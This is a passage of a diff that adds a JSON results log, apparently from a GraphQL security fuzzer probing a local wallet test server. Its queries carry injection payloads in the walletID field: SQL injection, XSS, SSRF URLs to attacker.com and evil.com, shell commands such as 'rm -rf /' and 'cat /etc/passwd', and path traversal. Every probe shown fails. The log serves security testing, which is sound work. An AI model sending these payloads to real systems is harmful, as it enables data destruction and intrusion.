+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getWallet\" argument \"walletID\" of type \"ID!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getWallet\" argument \"walletID\" of type \"ID!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet001\") {\n    id\n    naame # Intentional typo to trigger a suggestion for 'name'\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T16:56:20.607405Z",
+    "count": 76,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"naame\" on type \"Wallet\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"naame\" on type \"Wallet\". Did you mean \"name\"?",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\") {\n    id\n    name\n    balance\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T16:56:26.121081Z",
+    "count": 77,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123' OR 1=1 --\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:56:28.649924Z",
+    "count": 78,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123<script>alert('XSS')</script>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-05T16:56:30.959249Z",
+    "count": 79,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"http://attacker.com/evil.php\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T16:56:33.133984Z",
+    "count": 80,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123; rm -rf /\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.013,
+    "timestamp": "2025-10-05T16:56:35.231734Z",
+    "count": 81,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"../../../../../etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:56:37.068166Z",
+    "count": 82,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123<h1>Hello HTML!</h1>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:56:39.349402Z",
+    "count": 83,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  myWallet: getWallet(walletID: \"wallet123\") {\n    id\n    name\n    balance\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.007,
+        "timestamp": "2025-10-05T16:56:42.291106Z",
+        "response_body": {
+          "data": {
+            "getWallet": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.006,
+        "timestamp": "2025-10-05T16:56:42.296981Z",
+        "response_body": {
+          "data": {
+            "myWallet": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 84,
+    "timestamp": "2025-10-05T16:56:42.297017Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.009,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-05T16:56:44.740373Z",
+    "count": 85,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"types\" on type \"Wallet\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"types\" on type \"Wallet\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getWallet\" argument \"walletID\" of type \"ID!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getWallet\" argument \"walletID\" of type \"ID!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\") {\n    id\n    balanc # Intentional typo to trigger a suggestion for 'balance'\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T16:56:46.812722Z",
+    "count": 86,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"balanc\" on type \"Wallet\". Did you mean \"balance\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"balanc\" on type \"Wallet\". Did you mean \"balance\"?",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\") {\n    id\n    name\n    balance\n    currency {\n      abbreviation\n      symbol\n    }\n    user {\n      id\n      firstName\n    }\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-05T16:56:52.768600Z",
+    "count": 87,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123' OR 1=1 --\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T16:56:55.072544Z",
+    "count": 88,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123<script>alert('XSS')</script>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-05T16:56:57.270657Z",
+    "count": 89,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"http://evil.com/wallet_data\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:56:58.916885Z",
+    "count": 90,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123; cat /etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:57:01.473300Z",
+    "count": 91,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"../../etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T16:57:03.203240Z",
+    "count": 92,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123<img src=x onerror=alert('HTMLi')>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:57:04.752360Z",
+    "count": 93,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.004,
+        "timestamp": "2025-10-05T16:57:07.389141Z",
+        "response_body": {
+          "data": {
+            "getWallet": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.003,
+        "timestamp": "2025-10-05T16:57:07.392443Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Syntax Error: Expected \"{\", found \":\".",
+              "locations": [
+                {
+                  "line": 2,
+                  "column": 18
+                }
+              ],
+              "extensions": {
+                "code": "GRAPHQL_PARSE_FAILED",
+                "exception": {
+                  "stacktrace": [
+                    "GraphQLError: Syntax Error: Expected \"{\", found \":\".",
+                    "    at syntaxError (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/error/syntaxError.js:15:10)",
+                    "    at Parser.expectToken (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:1423:40)",
+                    "    at Parser.many (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:1533:10)",
+                    "    at Parser.parseSelectionSet (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:265:24)",
+                    "    at Parser.parseOperationDefinition (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:193:26)",
+                    "    at Parser.parseDefinition (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:131:23)",
+                    "    at Parser.many (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:1537:26)",
+                    "    at Parser.parseDocument (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:109:25)",
+                    "    at Object.parse (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:36:17)",
+                    "    at parse (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:208:34)"
+                  ]
+                }
+              }
+            }
+          ]
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 94,
+    "timestamp": "2025-10-05T16:57:07.392465Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.01,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery walletAlias: getWallet(walletID: \"wallet123\") {\n  getWallet\n  name\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.009,
+        "timestamp": "2025-10-05T16:57:09.395358Z",
+        "response_body": {
+          "data": {
+            "getWallet": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.008,
+        "timestamp": "2025-10-05T16:57:09.403687Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Syntax Error: Expected \"{\", found \":\".",
+              "locations": [
+                {
+                  "line": 2,
+                  "column": 18
+                }
+              ],
+              "extensions": {
+                "code": "GRAPHQL_PARSE_FAILED",
+                "exception": {
+                  "stacktrace": [
+                    "GraphQLError: Syntax Error: Expected \"{\", found \":\".",
+                    "    at syntaxError (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/error/syntaxError.js:15:10)",
+                    "    at Parser.expectToken (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:1423:40)",
+                    "    at Parser.many (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:1533:10)",
+                    "    at Parser.parseSelectionSet (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:265:24)",
+                    "    at Parser.parseOperationDefinition (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:193:26)",
+                    "    at Parser.parseDefinition (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:131:23)",
+                    "    at Parser.many (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:1537:26)",
+                    "    at Parser.parseDocument (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:109:25)",
+                    "    at Object.parse (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:36:17)",
+                    "    at parse (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:208:34)"
+                  ]
+                }
+              }
+            }
+          ]
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 95,
+    "timestamp": "2025-10-05T16:57:09.403733Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.01,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet {\n    types {\n      name\n      kind\n      description\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-05T16:57:11.533289Z",
+    "count": 96,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"types\" on type \"Wallet\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"types\" on type \"Wallet\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getWallet\" argument \"walletID\" of type \"ID!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getWallet\" argument \"walletID\" of type \"ID!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
